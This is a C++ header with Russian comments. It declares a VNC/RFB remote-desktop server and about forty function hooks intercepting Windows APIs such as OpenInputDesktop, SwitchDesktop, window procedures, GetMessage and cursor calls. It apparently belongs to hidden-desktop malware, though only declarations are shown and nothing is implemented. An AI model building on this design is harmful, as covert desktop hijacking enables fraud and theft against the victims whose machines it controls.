/*
  Создание и управление декстопом для удаленного доступа по протоколу RFB.
*/
#pragma once

#if(BO_VNC > 0)
namespace VncServer
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Создание сессии.

    IN s   - сокет клиента.
    
    Return - true - в случаи успешной сессии,
             false - в случаи ошибки.
  */
  bool start(SOCKET s);

  /*
    Запуск цикла рисования окон.

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool startAsPaintThread(void);

  /*
    Перехватчик OpenInputDesktop.
  */
  HDESK WINAPI hookerOpenInputDesktop(DWORD flags, BOOL inherit, ACCESS_MASK desiredAccess);

  /*
    Перехватчик SwitchDesktop.
  */
  BOOL WINAPI hookerSwitchDesktop(HDESK desktop);

  /*
    Перехватчик DefWindowProcW.
  */
  LRESULT WINAPI hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefWindowProcA.
  */
  LRESULT WINAPI hookerDefWindowProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefDlgProcW.
  */
  LRESULT WINAPI hookerDefDlgProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefDlgProcA.
  */
  LRESULT WINAPI hookerDefDlgProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefFrameProcW.
  */
  LRESULT WINAPI hookerDefFrameProcW(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);
  
  /*
    Перехватчик DefFrameProcA.
  */
  LRESULT WINAPI hookerDefFrameProcA(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefMDIChildProcW.
  */
  LRESULT WINAPI hookerDefMDIChildProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик DefMDIChildProcA.
  */
  LRESULT WINAPI hookerDefMDIChildProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);  
    
  /*
    Перехватчик CallWindowProcW.
  */
  LRESULT WINAPI hookerCallWindowProcW(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик CallWindowProcW.
  */
  LRESULT WINAPI hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    Перехватчик RegisterClassW.
  */
  ATOM WINAPI hookerRegisterClassW(WNDCLASSW *wndClass);
  
  /*
    Перехватчик RegisterClassA.
  */
  ATOM WINAPI hookerRegisterClassA(WNDCLASSA *wndClass);

  /*
    Перехватчик RegisterClassExW.
  */
  ATOM WINAPI hookerRegisterClassExW(WNDCLASSEXW *wndClass);

  /*
    Перехватчик RegisterClassExA.
  */
  ATOM WINAPI hookerRegisterClassExA(WNDCLASSEXA *wndClass);

  /*
    Перехватчик BeginPaint.
  */
  HDC WINAPI hookerBeginPaint(HWND window, LPPAINTSTRUCT paint);
  
  /*
    Перехватчик EndPaint.
  */
  BOOL WINAPI hookerEndPaint(HWND window, const PAINTSTRUCT *paint);
  
  /*
    Перехватчик GetDCEx.
  */
  HDC WINAPI hookerGetDcEx(HWND window, HRGN clip, DWORD flags);
  
  /*
    Перехватчик GetDC.
  */
  HDC WINAPI hookerGetDc(HWND window);

  /*
    Перехватчик GetWindowDC.
  */
  HDC WINAPI hookerGetWindowDc(HWND window);

  /*
    Перехватчик ReleaseDC.
  */
  int WINAPI hookerReleaseDс(HWND window, HDC dc);

  /*
    Перехватчик GetUpdateRect.
  */
  BOOL WINAPI hookerGetUpdateRect(HWND window, LPRECT rect, BOOL erase);
  
  /*
    Перехватчик GetUpdateRgn.
  */
  int WINAPI hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase);

  /*
    Перехватчик GetMessagePos.
  */
  DWORD WINAPI hookerGetMessagePos(void);
  
  /*
    Перехватчик GetCursorPos.
  */
  BOOL WINAPI hookerGetCursorPos(LPPOINT point);

  /*
    Перехватчик SetCursorPos.
  */
  BOOL WINAPI hookerSetCursorPos(int x, int y);

  /*
    Перехватчик SetCapture.
  */
  HWND WINAPI hookerSetCapture(HWND window);

  /*
    Перехватчик ReleaseCapture.
  */
  BOOL WINAPI hookerReleaseCapture(void);

  /*
    Перехватчик GetCapture.
  */
  HWND WINAPI hookerGetCapture(void);

  /*
    Перехватчик GetMessageW.
  */
  BOOL WINAPI hookerGetMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);

  /*
    Перехватчик GetMessageA.
  */
  BOOL WINAPI hookerGetMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);

  /*
    Перехватчик PeekMessageW.
  */
  BOOL WINAPI hookerPeekMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);

  /*
    Перехватчик PeekMessageA.
  */
  BOOL WINAPI hookerPeekMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);
};
#endif
